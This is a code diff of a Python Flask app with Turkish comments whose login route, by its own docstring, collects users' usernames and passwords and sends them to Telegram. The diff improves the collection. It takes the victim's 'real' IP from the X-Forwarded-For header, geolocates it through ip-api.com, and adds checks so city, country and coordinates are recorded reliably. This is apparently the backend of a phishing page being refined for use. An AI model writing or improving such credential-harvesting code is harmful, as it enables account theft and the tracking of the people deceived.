@@ -18,7 +18,7 @@ def get_location(ip):
     url = f"http://ip-api.com/json/{ip}"
     response = requests.get(url).json()
     
-    if response["status"] == "success":
+    if response.get("status") == "success":
         return response
     return None
 
@@ -32,10 +32,13 @@ def login():
     """Kullanıcı giriş bilgilerini alıp Telegram'a gönderen route"""
     username = request.form.get('username')  # Kullanıcı adı
     password = request.form.get('password')  # Şifre
-    user_ip = request.remote_addr  # IP adresini al
+
+    # 🔥 Gerçek IP adresini almak için güncellendi
+    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
     location = get_location(user_ip)  # IP'den konum bilgisi al
-    if location:
+
+    if location and "city" in location and "country" in location:
         location_text = f"{location['city']}, {location['country']} (Lat: {location['lat']}, Lon: {location['lon']})"
     else:
         location_text = "Konum alınamadı"
